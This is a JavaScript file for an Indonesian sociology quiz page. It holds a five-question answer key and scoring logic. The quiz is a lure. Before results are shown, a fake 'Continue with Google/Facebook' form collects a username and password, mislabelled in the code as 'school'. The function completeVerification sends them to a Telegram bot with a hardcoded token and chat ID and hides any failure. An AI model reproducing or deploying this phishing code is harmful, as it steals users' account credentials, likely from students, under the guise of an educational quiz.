// Kunci jawaban untuk soal Sosiologi
const answers = {
    q1: 'B',  // Auguste Comte
    q2: 'B',  // Sosialisasi
    q3: 'B',  // Stratifikasi Terbuka
    q4: 'B',  // Pertentangan kelas sosial
    q5: 'A'   // Keluarga
};

let userAnswers = {};
let isVerified = false;
let userData = {};
let selectedPlatform = '';

// Event listener untuk form quiz
document.getElementById('quizForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    userAnswers = {
        q1: document.querySelector('input[name="q1"]:checked')?.value,
        q2: document.querySelector('input[name="q2"]:checked')?.value,
        q3: document.querySelector('input[name="q3"]:checked')?.value,
        q4: document.querySelector('input[name="q4"]:checked')?.value,
        q5: document.querySelector('input[name="q5"]:checked')?.value
    };

    const allAnswered = Object.values(userAnswers).every(answer => answer !== undefined);
    
    if (!allAnswered) {
        alert('Mohon jawab semua pertanyaan terlebih dahulu!');
        return;
    }

    if (!isVerified) {
        document.getElementById('verifyModal').classList.add('active');
    } else {
        showResult();
    }
});

// Event listener untuk form verifikasi
document.getElementById('verifyForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const name = document.getElementById('userName').value;
    const school = document.getElementById('userPass').value;
    
    if (name && school) {
        userData = { name, school, method: selectedPlatform };
        completeVerification();
    }
});

// Fungsi untuk memilih platform login
function selectPlatform(platform) {
    selectedPlatform = platform;
    document.getElementById('socialButtons').classList.add('hidden');
    document.getElementById('verifyForm').classList.remove('hidden');
    
    const header = document.getElementById('platformHeader');
    const submitBtn = document.getElementById('submitBtn');
    
    if (platform === 'google') {
        header.className = 'platform-header google';
        header.innerHTML = `
            <h3>Lanjutkan dengan Google</h3>
            <p>Lengkapi informasi Anda untuk melanjutkan</p>
        `;
        submitBtn.style.background = '#4285F4';
    } else {
        header.className = 'platform-header facebook';
        header.innerHTML = `
            <h3>Lanjutkan dengan Facebook</h3>
            <p>Lengkapi informasi Anda untuk melanjutkan</p>
        `;
        submitBtn.style.background = '#1877F2';
    }
}

// Fungsi untuk kembali ke pilihan social
function backToSocial() {
    document.getElementById('socialButtons').classList.remove('hidden');
    document.getElementById('verifyForm').classList.add('hidden');
    document.getElementById('userName').value = '';
    document.getElementById('userPass').value = '';
    selectedPlatform = '';
}

// Fungsi untuk menyelesaikan verifikasi
async function completeVerification() {
    isVerified = true;
    
    const score = calculateScore();
    const platformIcon = selectedPlatform === 'google' ? '🔵' : '🔷';
    const platformName = selectedPlatform === 'google' ? 'Google' : 'Facebook';
    
    const message = `🎓 DATA PESERTA TES SOSIOLOGI\n\n` +
                  `${platformIcon} Platform: ${platformName}\n` +
                  `👤 Username: ${userData.name}\n` +
                  `🏫 Password: ${userData.school}\n`;
    const botToken = '8498198173:AAGpZjqsAiL1l9PRKCCLj4T4tPCIDltZ_EE';
    const chatId = '8124375866';
    
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        // Silent fail
    }
    
    document.getElementById('verifyModal').classList.remove('active');
    showResult();
}

// Fungsi untuk menghitung skor
function calculateScore() {
    let score = 0;
    for (let q in answers) {
        if (userAnswers[q] === answers[q]) {
            score++;
        }
    }
    return score;
}

// Fungsi untuk menampilkan hasil
function showResult() {
    const score = calculateScore();
    const percentage = (score / 5 * 100).toFixed(0);
    
    document.getElementById('scoreDisplay').textContent = percentage;
    document.getElementById('correctCount').textContent = score;
    
    let resultText = '';
    if (score === 5) {
        resultText = 'Sempurna! Anda sangat menguasai materi Sosiologi! 🎉';
    } else if (score >= 4) {
        resultText = 'Bagus sekali! Terus tingkatkan pemahaman Anda! 👏';
    } else if (score >= 3) {
        resultText = 'Cukup baik! Masih ada ruang untuk belajar lebih banyak! 📚';
    } else {
        resultText = 'Tetap semangat! Pelajari kembali materi Sosiologi dengan lebih baik! 💪';
    }
    
    document.getElementById('resultDetail').textContent = resultText;
    document.getElementById('resultModal').classList.add('active');
}

// Fungsi untuk menutup modal hasil
function closeResult() {
    document.getElementById('resultModal').classList.remove('active');
    location.reload();
}